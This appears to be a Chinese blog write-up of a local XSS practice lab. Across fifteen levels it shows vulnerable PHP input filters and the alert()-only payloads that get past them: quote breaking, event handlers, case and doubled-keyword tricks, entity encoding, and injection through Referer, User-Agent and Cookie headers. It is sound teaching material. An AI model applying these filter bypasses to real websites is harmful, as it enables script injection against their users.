---
title: XSS小游戏
date: 2019-02-25 19:15:28
categories: WEB安全
tags: 靶机实验

---
<blockquote class="blockquote-center">生命中遇到最美的景致，并不需要浓墨重彩去描绘，而是平常心踩出的一串淡淡的足迹。</blockquote>

<div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=33418871&auto=1&height=66"></iframe></div>

今天在网上找到了一个XSS小游戏，觉得蛮好玩的，刚好自己对XSS理解不深，拿来学习正好！

这个XSS程序直接放到phpstudy中，访问即可

那么就开始我们的探索旅程吧！



## Level 1：

根据URL和网页源代码可以看出test变量是可控的

```
http://127.0.0.1/xss/level1.php?name=test
```

```
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level2.php?keyword=test"; 
}
</script>
```

那么可以构造payload，将test替换成payload即可,为：

```
"<script>alert(/xss/)</script>
```

我原先以为需要闭合前面的双引号才可以执行payload进行弹窗，但是不闭合也是可以弹窗的：

```
<script>alert(/xss/)</script>
```

## Level 2:

先把第一关的payload拿来试试，看看被过滤了哪些参数

```
<title>欢迎来到level2</title>
</head>
<body>
<h1 align=center>欢迎来到level2</h1>
<h2 align=center>没有找到和&lt;script&gt;alert(xss)&lt;/script&gt;相关的结果.</h2><center>
<form action=level2.php method=GET>
<input name=keyword  value="<script>alert(xss)</script>">
<input type=submit name=submit value="搜索"/>
</form>
</center><center><img src=level2.png></center>
<h3 align=center>payload的长度:27</h3></body>
</html>
```

发现是把URL中的keyword参数的值进行了编码，这是使用了一个过滤函数htmlspecialchars()将预定义的字符转换成HTML实体，但是并未对input标签内的test值进行编码，那么我们可以对这个标签构造闭合，payload为：

```
"><script>alert(/xss/)</script>
```

## Level 3:

这次我们在搜索框输入xss，首先判断服务器将我们输入的内容放在代码的哪个位置，然后尝试闭合绕过

```
<title>欢迎来到level3</title>
</head>
<body>
<h1 align=center>欢迎来到level3</h1>
<h2 align=center>没有找到和xss相关的结果.</h2><center>
<form action=level3.php method=GET>
<input name=keyword  value='xss'>
<input type=submit name=submit value=搜索 />
</form>
</center><center><img src=level3.png></center>
<h3 align=center>payload的长度:3</h3></body>
</html>
```

可以看到有两处我们所搜索的xss字符串

而且发现URL也改变啦

```
http://127.0.0.1/xss/level3.php?keyword=xss&submit=%E6%90%9C%E7%B4%A2
```

试了好几个payload都没有成功，然后没办法，开始看代码

发现有一段PHP代码

```
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
<form action=level3.php method=GET>
<input name=keyword  value='".htmlspecialchars($str)."'>
<input type=submit name=submit value=搜索 />
</form>
</center>";
?>
```

其中涉及到htmlspecialchars() 函数

在网上查了查这个函数，他是把预定义的字符转换为 HTML 实体。

```

Character	HTML Entity	Notes
&	          &amp;	 
"	          &quot;	  Depending on how [quote_style] is set
'	          &#039	      Depending on how [quote_style] is set
>	          &gt;	 
<	          &lt;	 
```

但是htmlspecialchars（）函数默认的配置不过滤单引号的。只有设置了:quotestyle选项为ENT_QUOTES才会过滤掉单引号。

我们来试一试用事件来弹框：

onmouseover 事件会在鼠标指针移动到指定的对象上时发生

```
'onmouseover=alert(1) x='
```

onclick 事件会在对象被点击时发生。

```
'onclick='window.alert()
```

还有其他事件也是可以实现的，我这里就演示两个！

## Level 4:

之后都是查看网站源码，旨在学习xss！

```
<?php 
ini_set("display_errors", 0); //关闭输出程序错误信息
$str = $_GET["keyword"];    //通过GET方式获取keyword变量的值
$str2=str_replace(">","",$str);  //将获取到的变量值中的>替换成空，并传递给变量str2
$str3=str_replace("<","",$str2);  //将获取到的str2的值中的<替换成空，并传递给str3
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level4.php method=GET>
<input name=keyword  value="'.$str3.'">  //设置输出框，将str3的值输出到框内
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```

因为所获取到的str3的值只是过滤掉<>这两个符号，我们将Level 3的payload进行修改成为：

当鼠标移动到这个字符串的时候弹窗

```
"onmouseover="alert(1) 
```

当鼠标点击输入框的时候弹窗

```
"onclick='window.alert()
```

## Level 5：

```
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);  //将传入的参数值中的<script>替换成<scr_ipt
$str3=str_replace("on","o_n",$str2); //将str2中的on字符串替换成o_n
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level5.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```

这里我们将无法使用JavaScript事件来进行弹窗。在这里附上JavaScript事件的事件表，以供学习参考

| 属性        | 当以下情况发生时，出现此事件   | FF   | N    | IE   |
| ----------- | ------------------------------ | ---- | ---- | ---- |
| onabort     | 图像加载被中断                 | 1    | 3    | 4    |
| onblur      | 元素失去焦点                   | 1    | 2    | 3    |
| onchange    | 用户改变域的内容               | 1    | 2    | 3    |
| onclick     | 鼠标点击某个对象               | 1    | 2    | 3    |
| ondblclick  | 鼠标双击某个对象               | 1    | 4    | 4    |
| onerror     | 当加载文档或图像时发生某个错误 | 1    | 3    | 4    |
| onfocus     | 元素获得焦点                   | 1    | 2    | 3    |
| onkeydown   | 某个键盘的键被按下             | 1    | 4    | 3    |
| onkeypress  | 某个键盘的键被按下或按住       | 1    | 4    | 3    |
| onkeyup     | 某个键盘的键被松开             | 1    | 4    | 3    |
| onload      | 某个页面或图像被完成加载       | 1    | 2    | 3    |
| onmousedown | 某个鼠标按键被按下             | 1    | 4    | 4    |
| onmousemove | 鼠标被移动                     | 1    | 6    | 3    |
| onmouseout  | 鼠标从某元素移开               | 1    | 4    | 4    |
| onmouseover | 鼠标被移到某元素之上           | 1    | 2    | 3    |
| onmouseup   | 某个鼠标按键被松开             | 1    | 4    | 4    |
| onreset     | 重置按钮被点击                 | 1    | 3    | 4    |
| onresize    | 窗口或框架被调整尺寸           | 1    | 4    | 4    |
| onselect    | 文本被选定                     | 1    | 2    | 3    |
| onsubmit    | 提交按钮被点击                 | 1    | 2    | 3    |
| onunload    | 用户退出页面                   | 1    | 2    | 3    |

但是这串代码没有过滤<字符和>字符，那么我们可以使用<a>标签的href属性构造payload进行弹窗

```
"> <a href="javascript:alert(1)">xss</a>
```

或者使用

```
"><a href="javascript:onclick=alert()">xss</a>
```

点击xss按钮即可弹窗，但是我不是很明白第二个payload，因为前面的PHP代码已经将on替换成0_n那么onclick不就变成了o_nclick，那么这个如何弹窗呢？我表示很困惑。。。。。后来发现网站并未将onclick中的on替换成o_n，所以便可以弹框。

## Level 6：

```
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level6.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```

emmmmm，看着这个代码过滤了很多的字符串，但是并没有进行大小写判定,很是好玩

```
"><ScRipT>alert(/xss/)</ScrIpt>
```

```
"ONclick="window.alert()
```

```
"><a HrEf="javascript:onclick=alert()">xss</a>
```

## Level 7：

```
<?php 
ini_set("display_errors", 0);
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level7.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```

查看源码，发现了网站对传入的参数进行了小写转换，并且将一些特殊值替换成空，那么我们可以将其进行双写绕过

```
"><Scrscriptipt>alert(/xss/)</scriScriptpt>
```

```
"OonNclick="window.alert()
```

```
"><a hrhrefef=javascriscriptpt:onclick=alert()>xss</a>
```

```
"><a hrhrefef=javascriscriptpt:alert()>xss</a>
```



## Level 8：

```
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);  //将script替换成scr_ipt
$str3=str_replace("on","o_n",$str2);   //将on替换成o_n
$str4=str_replace("src","sr_c",$str3);  
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);  //将双引号替换成&quot
echo '<center>
<form action=level8.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">  //将所获取到的字符串进行HTML编码
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
 echo '<center><BR><a href="'.$str7.'">友情链接</a></center>'; //通过href属性将￥str7变量输出到页面
?>
<center><img src=level8.jpg></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str7)."</h3>";
?>
```

后台做了三个措施：将特殊字符替换/将获取到的字符串进行HTML编码/通过href属性将处理后得值输出

网上的教程是将伪协议JavaScript：alert（1）中的script的一个字符进行HTML编码绕过防护

```
javascri&#x70;t:alert()
```

或者

```
javascri&#112;t:alert()
```

## Level 9:

```
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level9.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
if(false===strpos($str7,'http://')) //如果str7中没有http：//
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';  //则报错
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>'; 
}
?>
<center><img src=level9.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str7)."</h3>";
?>
```

那么我们可以构造payload：

```
javascri&#x0070;t:alert(1)/*http://www.baidu.com*/
```

只要让程序检测到http://但不让这个生效即可，可以采用注释的方法构造payload。



## Level 10：

```
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str11 = $_GET["t_sort"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```

分析代码，发现需要两个参数，一个是keyword，一个是t_sort，尖括号<>都被转换成空，还有三个hidden的隐藏输入框，

或许我们可以从隐藏的输入框下手

构造payload为：

```
keyword = test&t_sort="type="text" onclick = "alert(1)
```

```
keyword = test&t_sort="type="text" onmouseover="alert(1)
```

```
keyword = test&t_sort="type="text" onmouseover=alert`1`
```



## Level 11：

查看后台代码

```
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_REFERER'];     //获取HTTP的REFERER头部信息
$str22=str_replace(">","",$str11);   //将所获取到的referer中的>替换为空
$str33=str_replace("<","",$str22);    //将变量$str22中的<替换成空
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ref"  value="'.$str33.'" type="hidden"> //在这里进行注入
</form>
</center>';
?>
```

查看代码，发现可以对referer头部注入

我们burp抓包，添加Referer头部，插入payload

```
GET /xss/level11.php?keyword=good%20job! HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: "onclick=alert(1) type="text"  //所添加的Referer头部
```

forward转发，关掉代理，点击页面的框即可弹窗成功！



## Level 12：

第12关和第11关蛮相似的，12关是对UA头部进行xss注入

```
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_USER_AGENT'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ua"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
```

payload为：

```
GET /xss/level12.php?keyword=good%20job! HTTP/1.1
Host: 127.0.0.1
User-Agent: " onmouseover=alert(1)  type="text"  //修改User-Agent值
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: user=call+me+maybe%3F
Connection: close
```



## Level 13：

```
<?php 
setcookie("user", "call me maybe?", time()+3600);  //setcookie函数用于向客户端发送一个cookie值
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_COOKIE["user"];    //使用$_COOKIE变量来取回cookie中user的值
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_cook"  value="'.$str33.'" type="hidden"> //再此进行注入
</form>
</center>';
?>
```

查看代码，发现是xss进行的cookie注入，那么抓包修改cookie即可

```
GET /xss/level13.php?keyword=good%20job! HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: user=" onclick=alert(1) type="text"
Connection: close
```



## Level 14：

查看源码

```
<h1 align=center>欢迎来到level14</h1>
<center><iframe name="leftframe" marginwidth=10 marginheight=10 src="http://www.exifviewer.org/" frameborder=no width="80%" scrolling="no" height=80%></iframe></center><center>这关成功后不会自动跳转。成功者<a href=/xsschallenge/level15.php?src=1.gif>点我进level15</a></center>
```

payload：

```
"><img src=1 onerror=alert(1)>
```



## Level 15：

```
<?php 
ini_set("display_errors", 0);
$str = $_GET["src"];
echo '<body><span class="ng-include:'.htmlspecialchars($str).'"></span></body>';
?>
```

**ng-include** 指令用于包含外部的 HTML 文件。

包含的内容将作为指定元素的子节点。

**ng-include** 属性的值可以是一个表达式，返回一个文件名。

默认情况下，包含的文件需要包含在同一个域名下。

其payload为：

```
src=level1.php?name=1'window.alert()
```

或者包含第一关

```
src='level1.php?name=<img src=x onerror=alert(1)>'
```



参考文章：[https://www.jianshu.com/p/06c644dafa0d](https://www.jianshu.com/p/06c644dafa0d)

​		   [https://www.cnblogs.com/bmjoker/p/9446472.html](https://www.jianshu.com/p/06c644dafa0d)